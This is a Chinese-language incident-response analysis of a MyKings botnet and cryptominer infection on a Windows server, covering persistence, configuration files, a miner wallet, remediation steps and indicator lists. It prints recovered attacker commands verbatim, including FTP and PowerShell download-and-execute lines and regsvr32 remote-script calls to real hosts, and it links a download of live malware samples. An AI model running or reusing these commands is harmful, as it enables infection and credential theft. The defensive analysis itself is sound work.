***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 知识点  

###  **MyKings**  

MyKings是一个大规模多重僵尸网络，并安装门罗币挖矿机，利用服务器资源挖矿。  

##  **概述**  

**挖矿攻击名称** | **MyKings**  
---|---  
**涉及平台** | Windows平台  
**相关恶意代码家族** | DDoS、Proxy、RAT、Mirai  
**攻击入口** | 通过扫描开放端口，利用漏洞和弱口令进行入侵  
**相关漏洞及编号** | 永恒之蓝  
**描述简介** | MyKings 是一个由多个子僵尸网络构成的多重僵尸网络，2017 年 4 月底以来，该僵尸网络一直积极地扫描互联网上 1433
及其他多个端口，并在渗透进入受害者主机后传播包括 DDoS、Proxy、RAT、Miner 在内的多种不同用途的恶意代码。  
  
### 1.攻击过程逻辑：

![2-1.jpg](https://image.3001.net/images/20190118/1547745652_5c40b974f090e.jpg!small)

图-攻击过程

![2-2.jpg](https://image.3001.net/images/20190118/1547745664_5c40b980504d9.jpg!small)

图-Payload执行过程

### 2.病毒各部分功能：

文件名 | 功能  
---|---  
c.bat | 关闭端口  
item.dat | 远控木马主体DLL  
J脚本(硬编码在Payload中) | 结束指定进程,删除文件,运行item.dat  
cmd批处理脚本(Payload联网获取到内存中) | 结束指定进程，删除文件，删除指定账户运行c.bat 、item.dat  
  
表-各部分功能

## 排查思路

### 1.攻击者利用SQL Server
弱密码进行暴力入侵方式入侵Windows系统后，会植入木马下载器conhost.exe(原始文件名ups.exe)，该程序启动后会首先访问恶意链接[http://ok.mymyxmra.ru](http://ok.xmr6b.ru/ok/down.html)以获取第二阶段恶意代码的下载地址。

根据C:/Windows/System32/b.txt产生的老的连接状态日志发现有大量外发扫描1433端口判断可能是通过SQL Server弱密码进来的。

![netstat.jpg](https://image.3001.net/images/20190116/1547626701_5c3ee8cd10dc0.jpg!small)

C:/Windows/Temp/conhost.exe源始文件名ups.exe：

###
![Temp.jpg](https://image.3001.net/images/20190116/1547626841_5c3ee9594edbc.jpg!small)2.查找异常进程

![proc-1.jpg](https://image.3001.net/images/20190116/1547627343_5c3eeb4f48bba.jpg!small)![proc-2.jpg](https://image.3001.net/images/20190116/1547627348_5c3eeb5409781.jpg!small)  

### 3.查找异常服务

服务名xWinWpdSrv

映像路径C:/Windows/system/msinfo.exe -s -syn 1000

![service.png](https://image.3001.net/images/20190116/1547627411_5c3eeb93e71ca.png!small)

扫描目标IP地址：生成机制越来越复杂

> 早期版本中， msinfo.exe用来扫描的目标IP只有两种：从云端配置文件wpd.dat获取、在本地根据外网出口IP随机生成；
>
> 最新样本中，增加了一种更复杂的本地随机生成算法，并且会避开一批保留地址段。

核心木马msinfo.exe用到的云端配置文件wpd.dat
，是一个加密的XML文档，其中指定了暴破成功后用到来下载Mirai样本的C2地址、需要扫描的网络服务端口、暴破各个端口所需的口令、入侵各个网络服务时执行的部分命令以及需要扫描的目标IP范围等配置。这些配置都可以根据后继僵尸网络的要求灵活更改。

模块化编程架构的msinfo.exe：主要是其Crack模块中通过继承一个基类Task_Crack，实现其中定义好的一组连接、暴破、执行命令等功能的函数接口即可定义一个Task_Crack_XXX子类，继而实现针对一个新的网络服务的攻击模块Crack模块与wpd.dat配置文件中定义的待扫描网络服务端口相对应，可以灵活更改针对不同网络服务的Crack功能。

其他辅助云端配置文件：msinfo.exe用到的另外一个辅助木马ups.exe
，会涉及其它云端配置文件。这些也都可以灵活配置，方便攻击者控制在下一阶段需要下载什么样本、执行什么样的命令。

### 4.查找异常计划任务

名称  
| 启动程序  
| 触发器  
  
---|---|---  
my1  
| c:/windows/system/my1.bat  
| 每天12点执行  
  
Mysa  
| cmd.exe >/c echo open ftp.ftp0930.host>s&echo test>>s&echo 1433>>s&echo
binary>>s&echo get a.exe c:\windows\update.exe>>s&echo bye  
| 系统启动执行  
  
Mysa1  
| rundll32.exe c:\windows\debug\item.dat,ServiceMain aaaa  
| 系统启动执行  
  
Mysa2  
| cmd.exe /c echo open ftp.ftp0930.host&ampgtp&ampampecho
test&ampgt&ampgtp&ampampecho 1433&ampgt&ampgtp&ampampecho get s.dat
c:\windows\debug\item.dat&ampgt&ampgtp&ampampecho bye&ampgt&ampgtp&ampampftp
-s:p  
| 系统启动执行  
  
ok  
| rundll32.exe c:\windows\debug\ok.dat,ServiceMain aaaa  
| 系统启动执行  
  
  
![task.jpg](https://image.3001.net/images/20190116/1547627842_5c3eed424a66b.jpg!small)

![task1.jpg](https://image.3001.net/images/20190117/1547705960_5c401e685d60c.jpg!small)

加载远控木马：

###
![taskkill.jpg](https://image.3001.net/images/20190117/1547707524_5c4024842c26f.jpg!small)5.查找异常启动项

![run.jpg](https://image.3001.net/images/20190117/1547707220_5c402354f358a.jpg!small)

### 6.查找异常防火墙和本地安全策略

![firewall.jpg](https://image.3001.net/images/20190117/1547707929_5c40261955882.jpg!small)![ipsec2.jpg](https://image.3001.net/images/20190117/1547707782_5c40258641571.jpg!small)

木马文件配置防火墙策略，关闭135、137、138、139、445端口，防止再被其他病毒感染。  

![ipsec.jpg](https://image.3001.net/images/20190117/1547707682_5c402522b745a.jpg!small)

### 7.查找异常目录&文件

C:/Windows/debug目录，门罗币挖矿相关的模块和配置文件：

![debug.jpg](https://image.3001.net/images/20190116/1547628475_5c3eefbb18250.jpg!small)

门罗币配置config.json

矿池url："pool.minexmr.com:5555"

钱包地址：

    
    
    4862mTLmCo9LGqn3XUrV9xaEfzgNPid7AM26XpeWWm4nfEtPfV9Eb1k2xYaYWRyM6LYETJkF3RCqF5JX5dQWEi3hNNE36C6

pass："x"

![poolconfig.jpg](https://image.3001.net/images/20190116/1547628698_5c3ef09a0f8dc.jpg!small)

C:/Windows/Help目录：  
![help3.jpg](https://image.3001.net/images/20190118/1547741502_5c40a93ec73f9.jpg!small)

C:/Windows/system目录。

msinfo.exe病毒母体通过注册服务&写入恶意代码到数据库的手段，实现持久化攻击，会连接云端，自动更新病毒，实时下载最新的攻击模块。  
![system.jpg](https://image.3001.net/images/20190116/1547628508_5c3eefdc7fee4.jpg!small)

C:/Windows/system32系统命令目录。

b.txt 端口连接状态；

a.exe主要功能是实现清除可疑木马进程和启动DiskWriter远控木马item.dat；

csrse.exe原始文件ups.exe：

![system32.jpg](https://image.3001.net/images/20190116/1547628508_5c3eefdc906ee.jpg!small)

C:/Windows/Temp临时文件目录，被注入的病毒代码执行恶意逻辑主要参照从C&C服务器请求到的配置文件，该文件释放到本地后路径为：%SystemRoot%\Temp\ntuser.dat。该文件被异或0x95加密过，在使用该文件时会对文件进行解密。

![Temp.jpg](https://image.3001.net/images/20190116/1547630315_5c3ef6ebca1f9.jpg!small)

解密后的ntuser.dat配置内容，如下图所示：

![ntuser.jpg](https://image.3001.net/images/20190118/1547744681_5c40b5a9b91ab.jpg!small)

ntuser.dat配置内容总体分为两个部分：main和update。main部分中的所有ip和网址用来下载后门病毒相关配置，update部分中的ip和网址用来更新ntuser.dat配置数据，请求到的相关配置信息至今依然在持续更新。下载后门病毒配置信息cloud.txt的代码逻辑。

## 下载后门病毒配置信息

请求到的配置信息中，除后门病毒下载地址（exe键名对应数据）外，还有名为url的配置项，该功能开启后会hook
CreateProcessW劫持浏览器启动参数，但现阶段该功能尚未被开启。配置信息，如下图所示：

![cloud.jpg](https://image.3001.net/images/20190118/1547744704_5c40b5c06e40e.jpg!small)

### 配置信息

恶意代码会通过上图中的下载地址，将后门病毒下载到%SystemRoot%\Temp\conhost.exe目录进行执行。下载执行远程后门病毒相关逻辑。

### 下载执行后门病毒

    
    
    Backdoor/Voluminer

该病毒运行后，首先会释放存放有C&C服务器列表的文件（xp.dat）至C:\Program Files\Common
Files目录中，之后向C&C服务器列表中的服务器地址请求xpxmr.dat文件，用于更新C&C服务器列表。请求到的xpxmr.dat文件数据使用RSA算法进行过加密，进行解密后会重新写入到xpxmr.dat文件中，该文件为明文存放。  

### 更新C&C服务器列表

病毒在运行中会向C&C服务器请求获取最新病毒版本号，当检测到存在新版本时，则会通过C&C服务器下载执行最新版本的病毒程序。当后门病毒发现当前系统为64位系统时，还会向C&C服务器请求64位版本的后门病毒到本地进行执行。

### 请求64位版本病毒

随后，病毒会使用地址列表中的C&C服务器地址下载挖矿所需的病毒组件，暂时我们发现会被病毒下载至本地病毒仅具有挖矿功能，但我们不排除其将来会下载其他病毒模块的可能性。病毒在下载文件后，会对病毒组件进行md5校验，病毒组件的md5值会参考C&C服务器中的md5.txt文件内容。

在该目录下有个以本机ip命名的txt文件

内容如下 ：

    
    
    --------------------------------------------------------         
    
    路径:C:\Windows\Temp\conhost.exe
    
    命令行:C:\Windows\Temp\conhost.exe                      
    
    路径:C:\Windows\SysWOW64\cmd.exe
    
    命令行:cmd /c ""C:\windows\web\c3.bat" "
    
    路径:C:\Windows\SysWOW64\cacls.exe
    
    命令行:cacls  c:\windows\temp\docv8.exe/e /d system
    
    路径:C:\Windows\system32\csrse.exe
    
    命令行:"C:\Windows\system32\csrse.exe" 
    
    路径:c:\windows\system\msinfo.exe
    
    命令行:c:\windows\system\msinfo.exe -s -syn 1000
    
    路径:c:\windows\debug\lsmo.exe
    
    命令行:c:\windows\debug\lsmo.exe 
    
    路径:C:\Windows\System32\cmd.exe
    
    命令行:"C:\Windows\System32\cmd.exe" /C ping 127.0.0.1 -n 6 & taskkill -f /im lsmose.exe & c:\windows\debug\lsmose.exe
    
    路径:c:\windows\debug\lsmose.exe
    
    命令行:c:\windows\debug\lsmose.exe
    
    路径:C:\Windows\system32\cmd.exe
    
    命令行:cmd /c powershell.exe -nop -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAA6ADgAOAA4ADgALwAyAC4AdAB4AHQAIgApAC4AdAByAGkAbQAoACkAIAAtAHMAcABsAGkAdAAgACIAWwBcAHIAXABuAF0AKwAiAHwAJQB7ACQAbgA9ACQAXwAuAHMAcABsAGkAdAAoACIALwAiACkAWwAtADEAXQA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAF8ALAAgACQAbgApADsAcwB0AGEAcgB0ACAAJABuADsAfQA=&powershell.exe    IEX (New-Object system.Net.WebClient).DownloadString('<http://wmi.1217bye.host:8888/S.ps1>')&powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('<http://173.208.139.170/s.txt>')&powershell.exe    IEX (New-Object system.Net.WebClient).DownloadString('<http://35.182.171.137/s.jpg>')||regsvr32 /u /s /i:<http://wmi.1217bye.host:8888/1.txt> scrobj.dll&ampregsvr32    /u /s /i:<http://173.208.139.170/2.txt> scrobj.dll&ampregsvr32 /u /s /i:<http://35.182.171.137/3.txt> scrobj.dll
    
    路径:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    
    命令行:powershell.exe  IEX (New-Object system.Net.WebClient).DownloadString('<http://173.208.139.170/s.txt>')
    
    -------------------------------------------- 

## 备注

加载远控木马，64base编码解码后得到：

    
    
    $ w c = N e w - O b j e c t   S y s t e m . N e t . W e b C l i e n t ; $ w c . D o w n l o a d S t r i n g ( " h t t p : / / w m i . 1 2 1 7 b y e . h o s t : 8 8 8 8 / 2 . t x t " ) . t r i m ( )   - s p l i t   " [ \ r    \ n ] + " | % { $ n = $ _ . s p l i t ( " / " ) [ - 1 ] ; $ w c . D o w n l o a d F i l e ( $ _ ,   $ n ) ; s t a r t   $ n ; }  

利用regsvr32执行远程脚本命令 /u /s /i: <http://wmi.1217bye.host:8888/1.txt> scrobj.dll
该txt文件为一个远程js脚本，js脚本里的字符都被用16进制进行替换，解密后的js脚本，其主要功能是下载木马文件并执行。

![1.jpg](https://image.3001.net/images/20190117/1547703501_5c4014cd9a2e5.jpg!small)解密后的远程脚本，Upsnew2释放远控木马item.dat以及c3.bat脚本。

![1-1.jpg](https://image.3001.net/images/20190117/1547703516_5c4014dc8ffa5.jpg!small)

    
    
    C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\DV6W313X   

ie临时文件目录下upsnew2[1].exe，原始文件名ups.exe：![temporary.jpg](https://image.3001.net/images/20190117/1547706391_5c4020172a9b3.jpg!small)

txt最下面是用mimikatz获得的系统明文密码：

![txt.jpg](https://image.3001.net/images/20190116/1547629921_5c3ef561b78bd.jpg!small)

![s.jpg](https://image.3001.net/images/20190117/1547706520_5c402098cb30b.jpg!small)

下载Invoke-Mimikatz.ps1脚本：![up.jpg](https://image.3001.net/images/20190117/1547708525_5c40286d7f272.jpg!small)

要结束的进程列表：

![kill.jpg](https://image.3001.net/images/20190117/1547708540_5c40287c86c9d.jpg!small)

C:/Windows/Web目录：  
![web.jpg](https://image.3001.net/images/20190116/1547628508_5c3eefdcdb4dd.jpg!small)c3.bat脚本功能如下：

![c3.jpg](https://image.3001.net/images/20190116/1547652106_5c3f4c0aaa371.jpg!small)

C:\Program Files\Common Files目录下：  

![common.jpg](https://image.3001.net/images/20190117/1547694718_5c3ff27ec2f67.jpg!small)C:/Program
Files/目录下：

![program.jpg](https://image.3001.net/images/20190117/1547694785_5c3ff2c19740a.jpg!small)C:/Windows/SysWOW64目录下，wpd.dat扫描的目标IP从云端配置文件：

![syswow64.jpg](https://image.3001.net/images/20190117/1547694718_5c3ff27ed5859.jpg!small)

C:/Windows/taidbox/mbrbackup.bin，暗云III v3.0：

![taidbox.jpg](https://image.3001.net/images/20190117/1547739945_5c40a329e94f1.jpg!small)

![guanjia.jpg](https://image.3001.net/images/20190117/1547740177_5c40a41119755.jpg!small)

暗云III v3.0其线程回调例程执行流程如下：

a)调用RtlInitUnicodeString初始化csrss.exe；

b)查找进程csrss.exe,检测到csrss.exe后则继续下一步；

c)感染MBR，并保护1到62扇区的数据，如果试图读前62扇区的数据则会返回正常的数据，如果试图写前62扇区的数据则返回写入的数据进行欺骗，实际没有被写入；

d)调用CreateSystemThread创建系统线程,该线程函数主要完成了shellcode下载执行等功能,可拉取任意功能恶意代码进行执行。

## 解决方案  

1.隔离感染主机：已中毒计算机尽快隔离，关闭所有网络连接，禁用网卡；

2.切断传播途径：从僵尸网络当前的攻击重点来看，防范其通过1433端口入侵计算机是非常有必要的。此外，Bot程序还有多种攻击方式尚未使用，这些攻击方式可能在未来的某一天被开启，因此也需要防范可能发生的攻击；

3.查找攻击源：加固SQL Server服务器，修补服务器安全漏洞。使用安全的密码策略，使用高强度密码，切勿使用弱口令，防止黑客暴力破解，禁用sa账号；

4.查杀病毒：使用管家急救箱进行查杀，下载网址：

<http://dlied6.qq.com/invc/xfspeed/qqpcmgr/other/SystemAidBoxPro.zip> ；

5.修补漏洞：特别注意445端口的开放情况，如果不需要使用Windows局域网共享服务，可以通过设置防火墙规则来关闭445等端口，并及时打上永恒之蓝MS17-010等漏洞相关补丁；

6.注意MSSQL，RDP，Telnet等服务的弱口令问题；

7.注意系统账户情况，禁用不必要的账户。

## 参考

1.具备多病毒功能！MiraiXMiner物联网僵尸网络攻击来袭

<https://www.freebuf.com/articles/terminal/191303.html>

2.恶意挖矿攻击的现状、检测及处置

<https://www.freebuf.com/articles/system/189454.html>

3.MyKings：一个大规模多重僵尸网络

<https://www.freebuf.com/articles/network/161286.html>

4.【木马分析】悄然崛起的挖矿机僵尸网络：打服务器挖价值百万门罗币

<https://www.anquanke.com/post/id/86751>  

5.MyKings僵尸网络最新变种突袭，攻击代码多次加密混淆，难以检测

<https://mp.weixin.qq.com/s/GJ4ilPNpe7NPevw4MHP0iw>

6.弱口令爆破SQL Server服务器 暗云、Mykings、Mirai多个病毒家族结伴来袭

<https://www.freebuf.com/column/193260.html>

7.暗云系列Bootkit木马最新动态

<https://www.freebuf.com/column/187489.html>

8.MyKing黑产团伙最新挖矿活动曝光

<https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=936>

9.中国黑客利用“永恒之蓝”搜刮肉鸡构建僵尸网络

[www.sohu.com/a/144223631_765820](http://www.sohu.com/a/144223631_765820)

10.僵尸网络“Mykings”

[www.voidcn.com/article/p-xdbozctv-brp.html](http://www.voidcn.com/article/p-xdbozctv-brp.html)

11.“隐匿者”病毒团伙技术升级传播病毒 暴力入侵电脑威胁全网用户

<https://www.secpulse.com/archives/75273.html>

12.彻底曝光黑客组织“隐匿者”：目前作恶最多的网络攻击团伙

[www.4hou.com/info/news/6838.html](http://www.4hou.com/info/news/6838.html)

13.代码战争的主阵地——来自终端的威胁情报详述.pdf

[www.studylead.com/p-7400580.html](http://www.studylead.com/p-7400580.html)

14.【木马分析】分析利用“永恒之蓝”漏洞传播的RAT

<https://www.anquanke.com/post/id/86822>

### 域名

    
    
    127.0.0.1  ftp.ftp0930.host
    
    127.0.0.1  pool.minexmr.com
    
    127.0.0.1  raw.githubusercontent.com
    
    127.0.0.1  wmi.1217bye.host
    
    127.0.0.1  down.mysking.info
    
    127.0.0.1  js.ftp0930.host
    
    127.0.0.1  js.mykings.top
    
    127.0.0.1  ftp.ftp0118.info
    
    127.0.0.1  ok.mymyxmra.ru      
    
    
    127.0.0.1  mbr.kill0604.ru

### ip

    
    
    173.208.139.170
    
    35.182.171.137      
    
    
    45.58.135.106      
    
    
    103.213.246.23
    
    78.142.29.152
    
    74.222.14.61
    
    18.218.14.96
    
    223.25.247.240
    
    223.25.247.152
    
    103.95.28.54
    
    23.88.160.137      
    
    
    81.177.135.35      
    
    
    78.142.29.110    
    
    174.128.239.250      
    
    
    66.117.6.174

暗云III v3.0 、Mykings、Mirai木马样本已放到网盘供学习。  

链接：<https://pan.baidu.com/s/14Hqb3IrjvAqykJSsgKk5Rw>

提取码：3uoq

***本文作者：xuchen16，转载请注明来自FreeBuf.COM**

